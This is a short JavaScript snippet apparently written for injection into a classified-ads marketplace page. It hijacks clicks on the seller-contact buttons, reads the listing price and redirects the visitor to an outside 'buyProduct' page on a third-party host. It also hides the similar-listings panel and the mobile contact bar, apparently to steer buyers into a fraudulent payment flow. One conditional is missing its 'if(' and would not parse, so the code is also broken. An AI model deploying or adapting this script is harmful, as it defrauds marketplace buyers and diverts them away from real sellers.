
setInterval(function(){
let ads_button = document.querySelector("div.b-advert-contact-buttons");
if(ads_button && ! ads_button.getAttribute("setattr")){
ads_button.addEventListener("click", function(){
ads_button.setAttribute("setattr","true");
let priceEl= document.querySelector("span.qa-advert-price-view-value");
let price = priceEl.getAttribute("content");
  location.href = `https://v0-scriptbank.vercel.app/buyProduct?price=${price}`
});
}


let ads_button2 = document.querySelector("div.b-advert-card-wrapper__bottom");

if(ads_button2 && !ads_button2.getAttribute("setattr")){
ads_button2.addEventListener("click", function(){
ads_button2.setAttribute("setattr","true")
let priceEl= document.querySelector("span.qa-advert-price-view-value");
let price = priceEl.getAttribute("content");
  location.href = `https://v0-scriptbank.vercel.app/buyProduct?price=${price}`;      
});
}

let similar = document.querySelector("div.h-dflex.h-pb-20.h-flex-dir-column");

if(similar && similar.style.display != "none" ){
  similar.style.display = "none";
}

  
let mobile = document.querySelector("div.active.b-mobile-bar.b-mobile-bar-new");

mobile && mobile.style.display != "none" ){
  mobile.style.display = "none";
}

}, 1000);

